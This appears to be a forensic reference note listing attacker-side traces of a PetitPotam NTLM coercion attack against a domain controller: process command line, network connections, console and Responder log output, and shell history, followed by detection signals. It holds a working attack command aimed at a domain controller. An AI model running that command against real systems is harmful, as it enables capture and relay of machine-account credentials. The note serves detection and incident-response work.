# PetitPotam — Source Evidence

**Attacker-side artifacts from running PetitPotam.**

---

## Process

- Python process: `python3 PetitPotam.py -t 192.168.1.10 -l 192.168.1.99`
- Short-lived (completes in ~5 seconds; may not be present if already terminated).
- No child processes.

---

## Network

**Outbound connections:**
```bash
ss -tnp | grep python
# TCP 192.168.1.99:50000 192.168.1.10:135 (RPC binding to endpoint mapper)
# TCP 192.168.1.99:50001 192.168.1.10:445 (EFS RPC call over SMB)
```

**Listening ports:** Only if Responder/ntlmrelayx are running (separate processes).

---

## Logs

**PetitPotam console output:**
```
[*] Targeting \\192.168.1.10
[*] Listening on 192.168.1.99
[+] Coercion attempt initiated
[+] Callback received from CORP\DC01$
```

**Responder logs (if running):**
- `logs/SMB-NTLMv2-Client-192.168.1.10.txt`: Captured DC machine account hash

---

## Shell History

```bash
grep PetitPotam ~/.bash_history
# Output: python3 PetitPotam.py -t 192.168.1.10 -l 192.168.1.99
```

---

## Strongest Signals

1. **PetitPotam process command-line** — Python with PetitPotam binary + target DC IP + attacker IP.
2. **Responder NTLM capture from DC machine account** — Unusual source (DC$, not user).
3. **Shell history with PetitPotam + DC IP + attacker IP** — Direct evidence.

---

**Next:** See `04 - Target Evidence.md`.
